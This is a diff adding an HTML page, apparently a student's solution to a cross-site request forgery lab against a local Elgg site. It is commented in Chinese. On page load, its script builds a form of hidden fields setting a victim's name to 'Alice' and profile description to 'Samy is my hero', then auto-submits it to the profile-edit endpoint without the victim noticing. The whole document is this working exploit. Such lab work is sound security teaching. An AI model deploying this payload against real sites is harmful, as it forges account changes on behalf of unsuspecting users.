@@ -1,0 +1,47 @@
+<html>
+
+<head>
+    <title> CSRF-Task2 by wxf </title>
+</head>
+
+<body>
+    <h1>
+        CSRF TASK 2
+    </h1>
+    <script type="text/javascript">
+        function post(url, fields) {// 提交表单函数
+            // 创建一个 <form> 元素
+            var p = document.createElement("form");
+            // 构造表单
+            p.action = url;
+            p.innerHTML = fields;
+            p.target = "_self";
+            p.method = "post";
+            // 将这个form表单添加到当前页面中
+            document.body.appendChild(p);
+            // 提交form表单
+            p.submit();
+        }
+        // CSRF攻击函数
+        function csrf_hack() {
+            var fields;
+            // 构造修改Elgg个人资料的表单具体内容
+            // description的内容设置为伪造的话
+            // 表单的类型是隐藏(hidden)的, 使得受害者不会察觉
+            fields += "<input type='hidden' name='name' value='Alice'>";
+            fields += "<input type='hidden' name='description' value='Samy is my hero'>";
+            fields += "<input type='hidden' name='accesslevel[description]' value='2'>";
+            fields += "<input type='hidden' name='briefdescription' value=''>";
+            fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+            fields += "<input type='hidden' name='location' value=''>";
+            fields += "<input type='hidden' name='accesslevel[location]' value='2'>";
+            fields += "<input type='hidden' name='guid' value='42'>";
+            var url = "http://www.csrflabelgg.com/action/profile/edit";
+            post(url, fields);
+        }
+        window.onload = function () { csrf_hack(); } // 当页面窗口加载时调用攻击函数
+    </script>
+</body>
+
+</html>
+
